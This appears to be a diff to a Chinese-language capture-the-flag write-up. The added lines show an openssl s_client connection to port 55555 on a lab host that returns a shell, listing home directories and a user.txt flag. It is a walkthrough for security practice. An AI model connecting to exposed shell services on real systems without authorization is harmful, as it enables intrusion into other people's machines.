@@ -303,5 +303,21 @@ Nmap done: 1 IP address (1 host up) scanned in 166.39 seconds
 ```
 我们直接ssl登录上去
 ```bash
-openssl s_client -connect 10.241.108.62:55555
+┌──(root㉿kali)-[/home/kali/tmp]
+└─# openssl s_client -connect 10.241.108.62:55555 -quiet
+Connecting to 10.241.108.62
+Can't use SSL_get_servername
+depth=0 C=US, ST=State, L=City, O=Maven, OU=Proxy, CN=localhost
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 C=US, ST=State, L=City, O=Maven, OU=Proxy, CN=localhost
+verify return:1
+sh-5.2$ ls /home
+ls /home
+mav1234   qc2000    terra536
+sh-5.2$ ls
+ls
+journel   user.txt
+
 ```
+这就直接拿到了user-shell
